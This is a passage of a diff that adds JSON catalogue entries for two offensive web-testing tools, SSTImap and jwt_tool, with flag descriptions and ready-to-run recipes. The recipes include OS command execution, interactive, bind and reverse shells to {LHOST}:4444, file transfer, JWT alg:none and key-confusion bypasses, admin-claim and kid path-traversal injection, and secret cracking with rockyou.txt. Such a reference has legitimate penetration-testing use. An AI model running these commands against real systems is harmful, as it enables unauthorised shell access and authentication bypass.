+            { "flag": "-c", "value": "'sid=...'", "desc": "HTTP Cookie" },
+            { "flag": "-H", "value": "'X-Api: 1'", "desc": "Custom HTTP header" },
+            { "flag": "--method", "value": "POST", "desc": "HTTP request method" },
+            { "flag": "-p", "value": "name", "desc": "Test a specific parameter" }
+          ]
+        },
+        {
+          "name": "Detection",
+          "flags": [
+            { "flag": "-e", "value": "Jinja2", "desc": "Force the template engine (--engine)" },
+            { "flag": "-t", "value": "render", "desc": "Detection technique: render / blind (--technique)" },
+            { "flag": "-O", "value": "linux", "desc": "Force the target OS (--os)" },
+            { "flag": "-lvl", "value": "1", "desc": "Check intensity level (--level)" },
+            { "flag": "--crawl", "value": "1", "desc": "Crawl the site and find forms" },
+            { "flag": "--forms", "desc": "Find and test HTML forms" }
+          ]
+        },
+        {
+          "name": "Request / Bypass",
+          "flags": [
+            { "flag": "-A", "value": "'UA'", "desc": "Custom User-Agent (--user-agent)" },
+            { "flag": "--random-agent", "desc": "Random User-Agent" },
+            { "flag": "--proxy", "value": "http://127.0.0.1:8080", "desc": "HTTP proxy" },
+            { "flag": "--tamper", "value": "script", "desc": "Tamper scripts for payload obfuscation" },
+            { "flag": "--force-overwrite", "desc": "Overwrite without safe restrictions" }
+          ]
+        },
+        {
+          "name": "Exploitation",
+          "flags": [
+            { "flag": "-x", "value": "'7*7'", "desc": "Execute code in the template language (--eval)" },
+            { "flag": "-o", "value": "'id'", "desc": "Execute an OS command (--os-cmd)" },
+            { "flag": "-s", "desc": "Interactive OS shell (--shell)" },
+            { "flag": "-i", "desc": "Interactive mode (--interactive)" },
+            { "flag": "-B", "value": "4444", "desc": "Bind shell on a port (--bind-shell)" },
+            { "flag": "-R", "value": "10.0.0.1:4444", "desc": "Reverse shell to {LHOST}:port (--reverse-shell)" },
+            { "flag": "-X", "value": "local,remote", "desc": "Upload a file to the target (--upload)" },
+            { "flag": "-D", "value": "remote,local", "desc": "Download a file from the target (--download)" }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "sstimap -u {TARGET}", "note": "SSTI detection and automatic engine identification" },
+        { "cmd": "sstimap -u {TARGET} -p name -x '7*7'", "note": "Check eval in the name parameter" },
+        { "cmd": "sstimap -u {TARGET} -s", "note": "On success - an interactive OS shell" },
+        { "cmd": "sstimap -u {TARGET} -R {LHOST}:4444", "note": "Get a reverse shell to your host" }
+      ],
+      "notes": "SSTImap is a maintained fork of tplmap (binary sstimap). First just run it on the URL - it identifies the engine itself and suggests a vector."
+    },
+    {
+      "title": "jwt_tool",
+      "subcategory": "JWT analysis and attacks",
+      "purpose": "A Swiss army knife for JWT: parsing and tampering tokens, checking common misconfigs (alg:none, key confusion, null-signature), cracking a weak secret and signing your own tokens.",
+      "install": "git clone https://github.com/ticarpi/jwt_tool && pip install -r jwt_tool/requirements.txt",
+      "binary": "python3 jwt_tool.py",
+      "target": "{TARGET}",
+      "modes": [],
+      "groups": [
+        {
+          "name": "Target / Token",
+          "flags": [
+            { "flag": "", "value": "{TARGET}", "desc": "The JWT itself is passed as a positional argument (the token to analyze/attack)" },
+            { "flag": "-t", "value": "https://site/api", "desc": "URL to send the token to and check the reaction (--targeturl)" },
+            { "flag": "-rc", "value": "'jwt=...'", "desc": "Cookies containing the token (--cookies)" },
+            { "flag": "-rh", "value": "'Authorization: Bearer ...'", "desc": "HTTP request headers (--headers)" },
+            { "flag": "-pd", "value": "'data'", "desc": "POST data for the request (--postdata)" },
+            { "flag": "-cv", "value": "'Welcome'", "desc": "Canary: expected text in a successful response (for auto-scoring)" }
+          ]
+        },
+        {
+          "name": "Scanning",
+          "flags": [
+            { "flag": "-M", "value": "pb", "desc": "Scan mode (--mode): pb=playbook (common misconfigs), at=all tests, cc=claim fuzzing, er=error forcing, cf=config check" }
+          ]
+        },
+        {
+          "name": "Exploits",
+          "flags": [
+            { "flag": "-X", "value": "a", "desc": "Attack type (--exploit): a=alg:none (signature bypass), n=key confusion RS/HS256, b=empty password, s=null-signature, k=key injection into the token, i=inline JWKS injection" },
+            { "flag": "-I", "desc": "Inject/modify claims in the token (with -pc/-pv for the payload, -hc/-hv for the header)" },
+            { "flag": "-pc", "value": "user", "desc": "Claim name in the payload (--pclaim)" },
+            { "flag": "-pv", "value": "admin", "desc": "Claim value in the payload (--pvalue)" },
+            { "flag": "-hc", "value": "kid", "desc": "Claim name in the header" },
+            { "flag": "-hv", "value": "../../x", "desc": "Claim value in the header" }
+          ]
+        },
+        {
+          "name": "Signing / Keys",
+          "flags": [
+            { "flag": "-S", "value": "hs256", "desc": "Algorithm for re-signing the token (--sign): hs256/rs256/none and others" },
+            { "flag": "-k", "value": "key.pem", "desc": "Key file (PEM) for signing/verification (--keyfile)" },
+            { "flag": "-p", "value": "secret", "desc": "Password/secret for signing or verification (--password)" },
+            { "flag": "-T", "desc": "Tamper: modify the contents of an existing token (--tamper)" }
+          ]
+        },
+        {
+          "name": "Cracking / Verification",
+          "flags": [
+            { "flag": "-C", "desc": "Crack a weak HMAC secret with a wordlist (--crack)" },
+            { "flag": "-d", "value": "rockyou.txt", "desc": "Wordlist for cracking the secret (--dict)" },
+            { "flag": "-V", "desc": "Verify the token signature with a given key (--verify)" }
+          ]
+        }
+      ],
+      "recipes": [
+        { "cmd": "python3 jwt_tool.py {TARGET}", "note": "Parse the token: show header/payload and hints" },
+        { "cmd": "python3 jwt_tool.py {TARGET} -M pb -t https://site/api -rh 'Authorization: Bearer {TARGET}'", "note": "Playbook scan of misconfigs directly against the service" },
+        { "cmd": "python3 jwt_tool.py {TARGET} -X a", "note": "alg:none attack - bypass signature verification" },
+        { "cmd": "python3 jwt_tool.py {TARGET} -C -d rockyou.txt", "note": "Crack a weak HMAC secret with a wordlist" }
+      ],
+      "notes": "The binary runs as python3 jwt_tool.py. To send against a target you need -t plus the token location (-rc/-rh/-pd). -X sets a specific attack, -M is the auto-scan."
+    }
+  ]
+}
